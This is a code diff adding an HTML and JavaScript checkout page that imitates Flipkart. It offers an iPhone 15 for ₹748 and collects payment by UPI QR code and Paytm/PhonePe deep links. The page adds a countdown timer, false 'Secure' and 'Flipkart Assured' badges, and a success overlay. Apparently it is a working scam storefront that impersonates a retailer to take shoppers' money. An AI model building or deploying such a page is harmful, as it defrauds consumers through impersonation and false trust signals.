@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Complete Payment – Flipkart</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --fk-blue: #2874f0;
+      --fk-green: #008c00;
+      --fk-yellow: #ffd814;
+      --fk-bg: #f1f3f6;
+      --fk-text: #212121;
+      --fk-muted: #878787;
+      --fk-border: #e8e8e8;
+      --shadow: 0 2px 12px rgba(0,0,0,0.06);
+      --shadow-sm: 0 1px 4px rgba(0,0,0,0.04);
+    }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--fk-bg); color: var(--fk-text);
+      min-height: 100vh; -webkit-font-smoothing: antialiased;
+    }
+    .app { max-width: 480px; margin: 0 auto; min-height: 100vh; background: var(--fk-bg); }
+
+    .header {
+      display: flex; align-items: center; gap: 10px;
+      padding: 14px 16px; background: #fff;
+      box-shadow: var(--shadow-sm); position: sticky; top: 0; z-index: 10;
+    }
+    .fk-logo { width: 30px; height: 30px; object-fit: contain; }
+    .header-text strong { display: block; font-size: 15px; font-weight: 700; letter-spacing: -0.2px; }
+    .header-text span { font-size: 11px; color: var(--fk-muted); }
+    .secure-badge {
+      margin-left: auto; display: flex; align-items: center; gap: 4px;
+      font-size: 10px; font-weight: 700; color: var(--fk-green);
+      background: #ecfdf0; padding: 5px 9px; border-radius: 20px;
+    }
+    .secure-badge svg { width: 12px; height: 12px; fill: var(--fk-green); }
+
+    .page { padding: 14px 14px 32px; }
+
+    .hero-card {
+      background: linear-gradient(135deg, #2874f0 0%, #1a5fd0 100%);
+      border-radius: 12px; padding: 18px 16px 16px;
+      color: #fff; margin-bottom: 14px; box-shadow: 0 4px 16px rgba(40,116,240,0.25);
+    }
+    .hero-top {
+      display: flex; gap: 10px; align-items: center;
+      padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.15);
+      margin-bottom: 14px;
+    }
+    .hero-top img {
+      width: 44px; height: 44px; object-fit: contain;
+      background: #fff; border-radius: 8px; padding: 4px;
+    }
+    .hero-top strong { font-size: 12px; line-height: 1.35; display: block; font-weight: 600; }
+    .hero-top span { font-size: 10px; opacity: 0.75; }
+    .amount-label { font-size: 11px; opacity: 0.8; margin-bottom: 2px; }
+    .amount-value { font-size: 36px; font-weight: 800; letter-spacing: -1px; line-height: 1; }
+    .amount-value small { font-size: 20px; font-weight: 700; margin-right: 2px; }
+    .timer-pill {
+      display: inline-flex; align-items: center; gap: 5px;
+      margin-top: 12px; background: rgba(255,255,255,0.15);
+      padding: 5px 10px; border-radius: 20px;
+      font-size: 11px; font-weight: 600;
+    }
+    .timer-pill svg { width: 13px; height: 13px; fill: #ffcdd2; }
+    .timer-pill span { color: #ffcdd2; font-weight: 800; }
+
+    .card {
+      background: #fff; border-radius: 12px;
+      box-shadow: var(--shadow); margin-bottom: 12px; overflow: hidden;
+    }
+    .qr-card { padding: 18px 16px; text-align: center; }
+    .qr-card p { font-size: 12px; color: var(--fk-muted); margin-bottom: 14px; font-weight: 500; }
+    .qr-wrap {
+      position: relative; display: inline-block;
+      padding: 12px; border-radius: 12px;
+      background: #fff; border: 1.5px solid #f0f0f0;
+      box-shadow: inset 0 0 0 1px rgba(0,0,0,0.02);
+    }
+    .qr-wrap img { width: 168px; height: 168px; display: block; border-radius: 4px; }
+    .qr-watermark {
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      width: 34px; height: 34px; background: #fff; border-radius: 8px;
+      padding: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+    }
+    .qr-watermark img { width: 100%; height: 100%; object-fit: contain; }
+
+    .section-head {
+      padding: 12px 14px 6px; font-size: 11px; font-weight: 700;
+      color: var(--fk-muted); text-transform: uppercase; letter-spacing: 0.6px;
+    }
+
+    .pay-list { padding: 0 10px 10px; }
+
+    .pay-btn {
+      display: flex; align-items: center; gap: 12px;
+      width: 100%; padding: 11px 12px; margin-bottom: 6px;
+      border: 1.5px solid transparent; border-radius: 10px;
+      background: #fafafa; cursor: pointer; font-family: inherit;
+      text-align: left; transition: background 0.15s, border-color 0.15s, transform 0.1s;
+    }
+    .pay-btn:active { transform: scale(0.985); background: #f0f0f0; }
+    .pay-btn.paytm { border-color: #e3f4fd; background: #f8fcff; }
+    .pay-btn.phonepe { border-color: #ede7f6; background: #faf8ff; }
+    .pay-btn.upi { border-color: #e8f5e9; background: #f8fdf8; }
+
+    .pay-logo {
+      width: 40px; height: 40px; border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; overflow: hidden; background: #fff;
+      box-shadow: var(--shadow-sm);
+    }
+    .pay-logo img { width: 100%; height: 100%; object-fit: contain; }
+    .pay-logo.paytm img { padding: 6px; object-fit: contain; }
+    .pay-logo.phonepe img { border-radius: 10px; }
+    .pay-logo.upi img { padding: 5px; }
+
+    .pay-btn-text { flex: 1; min-width: 0; }
+    .pay-btn-text strong { display: block; font-size: 13px; font-weight: 700; color: var(--fk-text); }
+    .pay-btn-text span { font-size: 11px; color: var(--fk-muted); margin-top: 1px; display: block; }
+
+    .pay-arrow {
+      width: 28px; height: 28px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .pay-arrow svg { width: 16px; height: 16px; fill: #fff; }
+    .pay-btn.paytm .pay-arrow { background: #00baf2; }
+    .pay-btn.phonepe .pay-arrow { background: #5f259f; }
+    .pay-btn.upi .pay-arrow { background: var(--fk-green); }
+
+    .utr-card { padding: 16px; }
+    .utr-card > p { font-size: 12px; color: var(--fk-muted); margin-bottom: 12px; line-height: 1.4; }
+    .utr-input {
+      width: 100%; padding: 13px 14px; border: 1.5px solid var(--fk-border);
+      border-radius: 8px; font-size: 15px; font-family: inherit;
+      letter-spacing: 0.5px; margin-bottom: 8px; background: #fafafa;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .utr-input:focus {
+      outline: none; border-color: var(--fk-blue); background: #fff;
+      box-shadow: 0 0 0 3px rgba(40,116,240,0.1);
+    }
+    .utr-help {
+      font-size: 11px; color: var(--fk-blue); font-weight: 600;
+      margin-bottom: 10px; cursor: pointer; border: none; background: none;
+      font-family: inherit; padding: 0;
+    }
+    .utr-help-panel {
+      display: none; font-size: 11px; color: #555; background: #f0f7ff;
+      border-radius: 8px; padding: 10px 12px; margin-bottom: 12px; line-height: 1.6;
+    }
+    .utr-help-panel.show { display: block; }
+    .submit-utr {
+      width: 100%; padding: 14px; border: none; border-radius: 8px;
+      background: var(--fk-blue); color: #fff; font-size: 14px;
+      font-weight: 800; cursor: pointer; font-family: inherit;
+      box-shadow: 0 3px 10px rgba(40,116,240,0.3);
+      transition: opacity 0.15s;
+    }
+    .submit-utr:active { opacity: 0.88; }
+    .submit-utr:disabled { opacity: 0.55; cursor: not-allowed; box-shadow: none; }
+    .gateway-link {
+      width: 100%; padding: 12px; margin-top: 8px; border: 1.5px solid var(--fk-blue);
+      border-radius: 8px; background: #fff; color: var(--fk-blue);
+      font-size: 12px; font-weight: 700; cursor: pointer; font-family: inherit;
+    }
+    .verify-status { font-size: 12px; color: var(--fk-muted); margin-bottom: 12px; line-height: 1.4; }
+    .verify-status.checking { color: var(--fk-blue); }
+    .verify-status.ok { color: var(--fk-green); font-weight: 600; }
+    .utr-msg { font-size: 11px; margin-top: 8px; min-height: 16px; font-weight: 500; }
+    .utr-msg.ok { color: var(--fk-green); }
+    .utr-msg.err { color: #e53935; }
+
+    .footer-note {
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      font-size: 10px; color: var(--fk-muted); margin-top: 4px; padding: 8px;
+    }
+    .footer-note svg { width: 13px; height: 13px; fill: var(--fk-green); }
+
+    .success-overlay {
+      display: none; position: fixed; inset: 0; z-index: 100;
+      background: rgba(255,255,255,0.97); backdrop-filter: blur(6px);
+      align-items: center; justify-content: center;
+      flex-direction: column; text-align: center; padding: 24px;
+    }
+    .success-overlay.show { display: flex; }
+    .success-icon {
+      width: 72px; height: 72px; border-radius: 50%;
+      background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+      color: var(--fk-green); display: flex; align-items: center; justify-content: center;
+      margin-bottom: 18px; box-shadow: 0 4px 20px rgba(0,140,0,0.15);
+    }
+    .success-icon svg { width: 36px; height: 36px; fill: currentColor; }
+    .success-overlay h2 { font-size: 22px; font-weight: 800; margin-bottom: 6px; color: var(--fk-green); }
+    .success-overlay p { font-size: 13px; color: var(--fk-muted); }
+
+    .error-page { padding: 48px 24px; text-align: center; background: #fff; min-height: 100vh; }
+    .error-page h2 { font-size: 18px; margin-bottom: 8px; color: #e53935; font-weight: 700; }
+    .error-page p { font-size: 13px; color: var(--fk-muted); margin-bottom: 20px; line-height: 1.5; }
+    .error-page a {
+      display: inline-block; padding: 13px 28px; background: var(--fk-yellow);
+      color: var(--fk-text); font-weight: 800; text-decoration: none; border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="app" id="app">
+    <div class="header">
+      <img class="fk-logo" src="images/flipkart-logo.png" alt="Flipkart">
+      <div class="header-text">
+        <strong>Complete Payment</strong>
+        <span>Secure UPI checkout</span>
+      </div>
+      <span class="secure-badge">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        Secure
+      </span>
+    </div>
+
+    <div class="page" id="payPage">
+      <div class="hero-card">
+        <div class="hero-top">
+          <img src="images/img-04-lineup.png" alt="iPhone 15">
+          <div>
+            <strong id="productName">APPLE iPhone 15 (Black, 128 GB)</strong>
+            <span id="orderMeta">Order · Flipkart Assured</span>
+          </div>
+        </div>
+        <div class="amount-label">Amount Payable</div>
+        <div class="amount-value"><small>₹</small><span id="payAmount">748</span></div>
+        <div class="timer-pill">
+          <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></svg>
+          Expires in <span id="timer">07:00</span>
+        </div>
+      </div>
+
+      <div class="card qr-card">
+        <p>Scan QR with any UPI app</p>
+        <div class="qr-wrap">
+          <img id="qrImage" src="" alt="UPI QR Code">
+          <div class="qr-watermark"><img src="images/upi-logo.png" alt="UPI"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="section-head">Pay using UPI apps</div>
+        <div class="pay-list">
+          <button class="pay-btn paytm" type="button" id="btnPaytm">
+            <div class="pay-logo paytm"><img src="images/paytm-logo.png" alt="Paytm"></div>
+            <div class="pay-btn-text"><strong>Paytm</strong><span>Pay using Paytm UPI</span></div>
+            <div class="pay-arrow"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+          </button>
+          <button class="pay-btn phonepe" type="button" id="btnPhonePe">
+            <div class="pay-logo phonepe"><img src="images/phonepe-logo.png" alt="PhonePe"></div>
+            <div class="pay-btn-text"><strong>PhonePe</strong><span>Pay using PhonePe</span></div>
+            <div class="pay-arrow"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+          </button>
+          <button class="pay-btn upi" type="button" id="btnUpi">
+            <div class="pay-logo upi"><img src="images/upi-logo.png" alt="UPI"></div>
+            <div class="pay-btn-text"><strong>Any UPI App</strong><span>GPay, BHIM &amp; more</span></div>
+            <div class="pay-arrow"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+          </button>
+        </div>
+      </div>
+
+      <div class="card utr-card">
+        <div class="section-head" style="padding-left:0;padding-top:0">After payment</div>
+        <p class="verify-status checking" id="verifyStatus">Waiting for payment… checking automatically</p>
+        <button class="submit-utr" type="button" id="checkBtn">I've Paid — Check Status</button>
+        <button class="gateway-link" type="button" id="gatewayLink" style="display:none">
+          Open payment page to submit UTR
+        </button>
+        <div class="utr-msg" id="utrMsg"></div>
+      </div>
+
+      <div class="footer-note">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        100% secure payment · Flipkart Assured
+      </div>
+    </div>
+  </div>
+
+  <div class="success-overlay" id="successOverlay">
+    <div class="success-icon">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+    </div>
+    <h2>Payment Successful!</h2>
+    <p>Redirecting to order confirmation…</p>
+  </div>
+
+  <script>
+    let PAY = null;
+    let pollTimer = null;
+    let pageClosed = false;
+
+    function loadPaymentData() {
+      try { return JSON.parse(sessionStorage.getItem('payment_data') || 'null'); }
+      catch (_) { return null; }
+    }
+    function isMobile() { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
+    function isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
+
+    function showError(msg) {
+      document.getElementById('app').innerHTML =
+        '<div class="error-page"><h2>Payment unavailable</h2><p>' + msg + '</p><a href="index.html">Back to shop</a></div>';
+    }
+
+    function init() {
+      PAY = loadPaymentData();
+      if (!PAY || !PAY.qr_code_url) {
+        showError('Payment session expired. Please try checkout again.');
+        return;
+      }
+      document.getElementById('productName').textContent =
+        sessionStorage.getItem('order_product') || 'APPLE iPhone 15 (Black, 128 GB)';
+      document.getElementById('orderMeta').textContent = 'Order ' + (PAY.order_id || '');
+      document.getElementById('payAmount').textContent =
+        Number(PAY.amount || 748).toFixed(2).replace(/\.00$/, '');
+      document.getElementById('qrImage').src = PAY.qr_code_url;
+      sessionStorage.setItem('pending_order_id', PAY.order_id || '');
+
+      if (PAY.payment_url) {
+        const gw = document.getElementById('gatewayLink');
+        gw.style.display = 'block';
+        gw.addEventListener('click', () => window.open(PAY.payment_url, '_blank'));
+      }
+
+      startTimer(7);
+      startPolling();
+      document.getElementById('btnPaytm').addEventListener('click', openPaytm);
+      document.getElementById('btnPhonePe').addEventListener('click', openPhonePe);
+      document.getElementById('btnUpi').addEventListener('click', openUpi);
+      document.getElementById('checkBtn').addEventListener('click', () => pollNow(true));
+    }
+
+    function startTimer(mins) {
+      let secs = mins * 60;
+      const el = document.getElementById('timer');
+      setInterval(() => {
+        if (pageClosed) return;
+        secs--;
+        if (secs < 0) { el.textContent = '00:00'; return; }
+        el.textContent = String(Math.floor(secs / 60)).padStart(2, '0') + ':' + String(secs % 60).padStart(2, '0');
+      }, 1000);
+    }
+
+    function openPaytm() {
+      if (!isMobile()) return;
+      if (isIOS()) { window.location.href = PAY.upi_link; return; }
+      const start = Date.now();
+      window.location.href = PAY.paytm_intent;
+      setTimeout(() => { if (Date.now() - start < 1500) window.location.href = PAY.upi_link; }, 1000);
+    }
+    function openPhonePe() {
+      window.location.href = (isMobile() && PAY.phonepe_intent) ? PAY.phonepe_intent : PAY.upi_link;
+    }
+    function openUpi() { if (PAY.upi_link) window.location.href = PAY.upi_link; }
+
+    function redirectSuccess(data) {
+      pageClosed = true;
+      clearInterval(pollTimer);
+      document.getElementById('successOverlay').classList.add('show');
+      sessionStorage.removeItem('payment_data');
+      const params = new URLSearchParams({
+        order_id: PAY.order_id,
+        status: 'SUCCESS',
+        utr: data.utr || '',
+        amount: String(data.amount || PAY.amount)
+      });
+      const target = PAY.redirect_url
+        ? PAY.redirect_url + (PAY.redirect_url.includes('?') ? '&' : '?') + params.toString()
+        : location.origin + '/callback.html?' + params.toString();
+      setTimeout(() => { location.href = target; }, 1800);
+    }
+
+    async function pollNow(manual) {
+      if (pageClosed) return;
+      const statusEl = document.getElementById('verifyStatus');
+      const msgEl = document.getElementById('utrMsg');
+      const orderId = PAY.order_id || sessionStorage.getItem('pending_order_id');
+      if (!orderId) return;
+
+      if (manual) {
+        statusEl.textContent = 'Checking payment status…';
+        statusEl.className = 'verify-status checking';
+      }
+
+      try {
+        const res = await fetch('/api/order-status?order_id=' + encodeURIComponent(orderId));
+        const text = await res.text();
+        if (!text.trim()) return;
+        const data = JSON.parse(text);
+
+        const payStatus = (data.payment_status || '').toUpperCase();
+
+        if (payStatus === 'SUCCESS') {
+          statusEl.textContent = 'Payment verified!';
+          statusEl.className = 'verify-status ok';
+          redirectSuccess(data);
+          return;
+        }
+
+        if (payStatus === 'PENDING') {
+          statusEl.textContent = manual
+            ? 'Payment pending — bank is processing. Wait 1–2 min and check again.'
+            : 'Waiting for payment… (auto-checking every 3s)';
+          statusEl.className = 'verify-status checking';
+          if (manual) msgEl.className = 'utr-msg';
+          if (manual) msgEl.textContent = 'If you already paid, wait a minute then tap Check Status again.';
+          return;
+        }
+
+        if (payStatus === 'FAILED' || payStatus === 'FAILURE') {
+          statusEl.textContent = 'Payment failed or expired.';
+          statusEl.className = 'verify-status';
+          msgEl.className = 'utr-msg err';
+          msgEl.textContent = 'Start a new order from the shop.';
+        }
+      } catch (e) {
+        if (manual) {
+          msgEl.className = 'utr-msg err';
+          msgEl.textContent = 'Could not check status. Try again.';
+        }
+      }
+    }
+
+    function startPolling() {
+      setTimeout(pollNow, 3000);
+      pollTimer = setInterval(pollNow, 3000);
+    }
+
+    init();
+  </script>
+</body>
+</html>
